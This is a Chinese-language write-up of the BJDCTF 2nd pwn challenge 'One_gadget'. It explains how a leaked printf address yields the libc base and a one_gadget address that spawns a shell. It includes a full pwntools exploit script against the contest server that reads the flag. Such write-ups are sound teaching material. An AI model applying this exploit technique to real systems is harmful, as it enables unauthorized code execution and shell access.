---
title: "BJDCTF 2nd Pwn One_gadget"
date: 2020-03-23T20:17:03+08:00
author: NiceSeven
categories:
  - BJDCTF 2nd
tags:
  - Pwn
---

# BJDCTF 2nd Pwn One_gadget

考点：

1、one_gadget小工具的使用

2、libc基地址的计算，利用基地址得出其他libc函数的地址

![image-20200323224603541](/images/image-20200323224603541.png)

![image-20200323224754035](/images/image-20200323224754035.png)

从main函数来看v4是个函数指针，传入一个函数地址就能执行，但是这里的v4是用%ld接收的所以传入的地址要是10进制的数字串，%ld表示数据按十进制有符号长型整数输入或输出

![image-20200323224820771](/images/image-20200323224820771.png)

有个init，直接打印出printf函数的真实地址，这样就可以通过这个地址减去libc中printf的偏移得到基地址，从而用基地址+one_gadget在libc中的偏移得出execve("/bin/sh\")的地址，在传给程序就能getshell

![image-20200323231722663](/images/image-20200323231722663.png)

选择0x106ef8这个one_gadget

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-

from pwn import *
context.log_level = 'debug'

#sh = process('./one_gadget')
sh = remote('node3.buuoj.cn',26004)
libc = ELF('./ubuntu19-x64-libc-2.29.so')

#sh.recvuntil('u:')
printf_addr = int(sh.recvuntil('\n')[-15:-1],16)
#int(s,16)这个函数将字符串转成16进制数
base_addr = printf_addr - libc.symbols['printf']#计算基地址
one_gadget = base_addr + 0x106ef8#计算one_gadget的地址

log.success('printf_addr: ' + hex(printf_addr))
log.success('libc_printf_offset: ' + hex(libc.symbols['printf']))
log.success('libc_base_addr: ' + hex(base_addr))
log.success('one_gadget_addr: ' +  hex(one_gadget))

payload = str(one_gadget) #因为是作为字符串传入的所以用str
print payload
sh.sendlineafter('one gadget:',payload)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200323231540907](/images/image-20200323231540907.png)

